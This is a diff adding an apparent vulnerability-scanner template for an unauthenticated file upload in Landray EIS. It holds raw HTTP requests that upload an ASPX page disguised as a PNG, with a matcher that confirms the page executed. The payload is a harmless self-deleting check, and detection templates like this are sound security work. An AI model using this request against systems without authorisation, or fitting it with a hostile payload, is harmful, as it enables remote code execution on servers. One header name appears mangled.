@@ -1,0 +1,52 @@
+http:
+    - cookie-reuse: true
+      matchers:
+        - dsl:
+            - status_code_2==200 && contains_all(body_2,"document.all.tpfile.value.length")
+          type: dsl
+      raw:
+        - |
+          GET /login.aspx?ReturnUrl=%2f_layouts%2fAuthenticate.aspx%3fSource%3d%252F&Source=%2F HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        - |
+          POST /frm/frm_form_upload.aspx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+          Accept-Encoding: gzip, deflate
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+          Connection: close
+          Cookie: FIOA_IMG_FOLDER=FI; Lang=zh-cn
+          Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+          Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
+          Content-Length: 751
+          Upgrade-Insecure-http: 1
+
+          -----------------------------{{boundary}}
+          Content-Disposition: form-data; name="__VIEWSTATE"
+
+          -----------------------------{{boundary}}
+          Content-Disposition: form-data; name="__EVENTTARGET"
+
+          GB_SAVE
+          -----------------------------{{boundary}}
+          Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+          保存
+          -----------------------------{{boundary}}
+          Content-Disposition: form-data; name="tpfile"; filename="{{filename}}.aspx"
+          Content-Type: image/png
+
+          <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+          -----------------------------{{boundary}}--
+id: landray-eis-frm-form-upload-fileupload
+info:
+    author: msk
+    name: landray-eis-frm-form-upload-fileupload
+    severity: high
+    tags:
+        - authenticate
+        - Ioa
+variables:
+    boundary: '{{to_lower(rand_base(20))}}'
+    filename: '{{to_lower(rand_base(10))}}'
